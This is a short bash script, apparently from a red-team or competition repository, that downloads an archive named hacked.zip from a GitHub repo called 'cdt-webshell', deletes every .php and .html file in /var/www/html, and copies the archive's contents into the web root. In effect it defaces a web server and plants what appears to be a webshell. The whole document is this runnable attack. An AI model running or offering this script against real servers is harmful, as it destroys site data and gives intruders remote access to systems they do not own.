#!/bin/bash
wget https://github.com/Tyfighter98/cdt-webshell/raw/master/hacked.zip
unzip hacked.zip
rm /var/www/html/*.php
rm /var/www/html/*.html
cp -r ./hacked/* /var/www/html
